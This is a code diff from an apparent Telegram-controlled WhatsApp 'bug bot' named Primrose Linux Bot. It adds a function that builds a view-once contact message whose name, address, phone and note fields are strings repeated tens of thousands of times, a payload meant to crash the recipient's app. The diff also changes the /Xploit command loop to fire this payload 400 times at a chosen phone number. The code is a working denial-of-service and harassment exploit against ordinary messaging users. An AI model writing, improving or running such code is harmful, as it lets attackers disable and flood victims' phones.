@@ -2209,6 +2209,41 @@ async function StickerFC(sock, target){
   return await sock.relayMessage(target, message, {})
 }
 
+async function Zxxcontact(sock, target) {
+  try {
+    const contactMessage = {
+      viewOnceMessage: {
+        message: {
+          contactMessage: {
+            displayName: "카나이 하티".repeat(20000),
+            vcard:
+              "BEGIN:VCARD\n" +
+              "VERSION:3.0\n" +
+              "FN:" + "카나이 하티".repeat(10000) + "\n" +
+              "ORG:" + "아르케인 엑소시스트".repeat(10000) + "\n" +
+              "ADR;TYPE=WORK:;;" + "서울특별시 강남구 테헤란로 101".repeat(10000) + ";;;\n" +
+              "TEL;type=CELL;waid=821012345678:" + "+821012345678".repeat(10000) + "\n" +
+              "NOTE:" + "관리자 전용 계정입니다.".repeat(20000) + "\n" +
+              "END:VCARD"
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(
+      target,
+      contactMessage,
+      {
+        participant: { jid: target }
+      }
+    );
+
+    console.log("✅ Success send:", target);
+  } catch (err) {
+    console.error("❌ Error sending:", err);
+  }
+}
+
 function createBugSuccessMessage(targetNumber, bugType, date) {
     return `
 <blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
@@ -2279,9 +2314,9 @@ bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
         reply_markup: createCheckButton(targetNumber)
     });
     
-    for (let i = 0; i < 70; i++) {
-        await MbaPe(sock, target);
-        await sleep(200);
+    for (let i = 0; i < 400; i++) {
+        await Zxxcontact(sock, target);
+        await sleep(2000);
     }
 });
 
